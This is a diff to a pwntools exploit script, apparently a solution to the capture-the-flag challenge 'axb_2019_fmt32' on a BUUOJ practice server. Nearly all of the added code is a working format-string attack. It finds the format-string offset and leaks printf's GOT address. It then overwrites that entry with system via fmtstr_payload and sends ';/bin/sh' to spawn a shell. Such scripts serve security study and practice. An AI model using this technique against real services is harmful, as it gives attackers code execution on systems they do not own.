@@ -28,14 +28,28 @@ uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
 context.log_level = 'DEBUG'
-binary = './pwn'
+binary = './axb_2019_fmt32'
 context.binary = binary
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',29776) if argv[1]=='r' else process(binary)
+p = remote('node3.buuoj.cn', 28576) if argv[1]=='r' else process(binary)
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 # start
+def exec_fmt(payload):
+	sla('me:',payload)
+	info = ru('\n')
+	return info
+auto = FmtStr(exec_fmt)
+offset = auto.offset
 
+sla('me:','a'+p32(elf.got['printf'])+'%{}$s'.format(offset))
+printf = u32(r()[14:18])
+leak('printf',printf)
+system,binsh = ret2libc(printf,'printf')
+payload = 'a'+fmtstr_payload(offset,{elf.got['printf']:system},numbwritten=10)
+sl(payload)
+ru('\n')
+sl(';/bin/sh\x00')
 # end
 
 itr()
